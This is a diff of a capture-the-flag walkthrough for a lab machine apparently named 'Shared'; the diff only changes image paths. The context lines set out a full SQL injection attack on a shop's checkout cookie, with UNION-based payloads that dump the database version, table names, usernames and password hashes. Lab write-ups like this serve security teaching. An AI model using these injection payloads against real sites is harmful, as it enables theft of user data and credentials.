@@ -1,4 +1,4 @@
-![RedPanda.PNG](/assets/Shared/Shared.png)
+![RedPanda.PNG](/assets/Machines/Medium/Shared/Shared.png)
 
 1. Send an ICMP echo request to machine's IP address.
 ```bash
@@ -22,51 +22,51 @@ PORT    STATE SERVICE
 
 3. Visit the web site
 
-![web.PNG](/assets/Shared/web.PNG)
+![web.PNG](/assets/Machines/Medium/Shared/web.PNG)
 ---
 
 You need to buy any product and click on **Proceed to checkout**
 
-![product.PNG](/assets/Shared/product.PNG)
+![product.PNG](/assets/Machines/Medium/Shared/product.PNG)
 
 
 4. Then, with BurpSuite try Inject SQL in the **cookies**, most especific in **custom_cart**
 
-![payment.PNG](/assets/Shared/payment.PNG)
+![payment.PNG](/assets/Machines/Medium/Shared/payment.PNG)
 
 ---
 
-![cookie.PNG](/assets/Shared/cookie.PNG)
+![cookie.PNG](/assets/Machines/Medium/Shared/cookie.PNG)
 
 5. Try with the next sentences:
 
 + `{"' or 1=0 union select 1,@@version,3-- - ":"1"}`
 
-![version.PNG](/assets/Shared/version.PNG)
+![version.PNG](/assets/Machines/Medium/Shared/version.PNG)
 
 ---
 
 + `{"' or 1=0 union select 1,database(),3 -- - ":"1"}`
 
-![db.PNG](/assets/Shared/b.PNG)
+![db.PNG](/assets/Machines/Medium/Shared/b.PNG)
 
 ---
 
 + `{"' or 1=0 union select 1,table_name,3 from information_schema.tables where table_schema='checkout'-- - ":"1"}`
 
-![table.PNG](/assets/Shared/table.PNG)
+![table.PNG](/assets/Machines/Medium/Shared/table.PNG)
 
 ---
 
 + `{"' or 1=0 union select 1,username,3 from user-- - ":"1"}`
 
-![user.PNG](/assets/Shared/user.PNG)
+![user.PNG](/assets/Machines/Medium/Shared/user.PNG)
 
 ---
 
 + `{"' or 1=0 union select 1,password,3 from user-- - ":"1"}`
 
-![password.PNG](/assets/Shared/password.PNG)
+![password.PNG](/assets/Machines/Medium/Shared/password.PNG)
 
 
 6. The password is hashed, use `hash-identifier` yo know the format
